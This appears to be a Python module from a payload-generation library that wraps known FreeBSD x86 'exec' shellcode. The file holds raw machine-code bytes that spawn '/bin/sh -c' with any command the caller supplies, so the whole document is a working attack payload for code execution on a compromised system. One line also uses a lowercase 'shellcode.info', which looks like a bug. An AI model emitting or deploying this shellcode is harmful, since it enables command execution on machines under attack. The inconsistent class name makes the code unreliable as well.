from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "s0t4ipv6"
    Shellcode.info["name"] = "FreeBSDx86 - exec shellcode"
    shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-91.php",
    ]

    def __init__(self, **kwargs):
        Shellcode.info["size"] = 44 + Shellcode().getsize(kwargs["execommand"])
        Shellcode.info["payload"] = [
            r"\xeb\x25\x59\x31\xc0\x50\x68\x6e\x2f\x73\x68" 
            r"\x68\x2f\x2f\x62\x69\x89\xe3"        
            r"\x50\x66\x68\x2d\x63\x89\xe7\x50"             	
            r"\x51\x57\x53\x89\xe7\x50\x57\x53"                 	
            r"\x50\xb0\x3b\xcd\x80\xe8\xd6\xff\xff\xff" 
            + kwargs["execommand"]
        ]
